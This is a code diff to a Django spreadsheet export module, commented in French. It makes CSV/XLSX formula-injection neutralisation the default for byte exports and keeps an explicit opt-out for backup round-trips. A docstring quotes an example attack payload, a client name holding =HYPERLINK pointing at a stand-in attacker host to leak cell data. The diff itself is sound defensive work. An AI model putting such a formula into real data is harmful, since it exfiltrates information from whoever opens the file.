@@ -79,10 +79,27 @@ def build_workbook(headers, rows, sheet_title='Export'):
     return wb
 
 
-def workbook_bytes(headers, rows, sheet_title='Export'):
-    """Sérialise le classeur partagé en ``bytes`` (export ZIP / non-HTTP)."""
+def workbook_bytes(headers, rows, sheet_title='Export', neutralize=True):
+    """Sérialise le classeur partagé en ``bytes`` (export ZIP / non-HTTP).
+
+    AUD802 — NEUTRALISÉ PAR DÉFAUT. Ce chemin ne servait pas que la sauvegarde
+    ZIP : SIX appelants remettent réellement le fichier à quelqu'un —
+    ``dataimport.exporters.export_xlsx`` (téléchargement),
+    ``reporting.rapport_builder`` (téléchargement),
+    ``reporting.rapport_abonnements`` (PIÈCE JOINTE E-MAIL),
+    ``reporting.scheduled_reports`` (pièce jointe e-mail ET rendu du lien
+    public tokenisé ``AllowAny``) et ``credit.views`` (deux exports). Un nom de
+    client ``=HYPERLINK("http://attaquant/?"&A1,"Voir")`` partait donc ACTIF.
+
+    ``neutralize=False`` est l'opt-out NOMMÉ, réservé au round-trip de
+    sauvegarde (``dataimport.exporters.build_backup_zip``) : neutraliser en
+    bloc préfixerait une apostrophe à chaque « +212… » du bundle et
+    corromprait la restauration.
+    """
     import io
 
+    if neutralize:
+        rows = neutralize_rows(rows)
     wb = build_workbook(headers, rows, sheet_title=sheet_title)
     buf = io.BytesIO()
     wb.save(buf)
@@ -94,15 +111,29 @@ def workbook_bytes(headers, rows, sheet_title='Export'):
 _RISKY_LEADING = ('=', '+', '-', '@')
 
 
-def _neutralize_cell(value):
+def neutralize_cell(value):
     """Préfixe une apostrophe aux chaînes texte commençant par = + - @.
 
     La cellule reste lisible (texte) et n'exécute jamais de formule. Ne
     concerne QUE les chaînes — nombres, booléens, dates passent intacts.
+
+    AUD802 — exposée en fonction PUBLIQUE : la neutralisation ne peut pas
+    rester privée à ``build_xlsx_response`` alors que six autres sites
+    REMETTENT réellement un fichier (téléchargements, pièces jointes e-mail et
+    un lien public ``AllowAny``).
     """
     if isinstance(value, str) and value[:1] in _RISKY_LEADING:
         return "'" + value
     return value
+
+
+#: Alias historique (ERR11) — conservé pour les appelants existants.
+_neutralize_cell = neutralize_cell
+
+
+def neutralize_rows(rows):
+    """Applique ``neutralize_cell`` à chaque cellule de chaque ligne."""
+    return [[neutralize_cell(v) for v in row] for row in rows]
 
 
 def build_xlsx_response(filename, headers, rows, sheet_title='Export'):
@@ -110,14 +141,17 @@ def build_xlsx_response(filename, headers, rows, sheet_title='Export'):
 
     ERR11 — chaque cellule TEXTE commençant par ``= + - @`` est neutralisée
     (apostrophe) pour qu'aucun export TÉLÉCHARGÉ n'exécute de formule à
-    l'ouverture. Le chemin octets (``workbook_bytes``, sauvegardes/restaurations)
-    n'est volontairement PAS neutralisé, pour préserver les valeurs au
-    round-trip (ex. un téléphone « +212… »).
+    l'ouverture.
+
+    AUD802 — ``workbook_bytes`` (chemin octets) est désormais neutralisé LUI
+    AUSSI par défaut : seul le round-trip de SAUVEGARDE s'en exempte
+    explicitement (``neutralize=False``), pour préserver les valeurs
+    (ex. un téléphone « +212… »).
     """
     from django.http import HttpResponse
 
-    safe_rows = [[_neutralize_cell(v) for v in row] for row in rows]
-    wb = build_workbook(headers, safe_rows, sheet_title=sheet_title)
+    wb = build_workbook(headers, neutralize_rows(rows),
+                        sheet_title=sheet_title)
     response = HttpResponse(content_type=XLSX_CONTENT_TYPE)
     response['Content-Disposition'] = f'attachment; filename="{filename}"'
     wb.save(response)
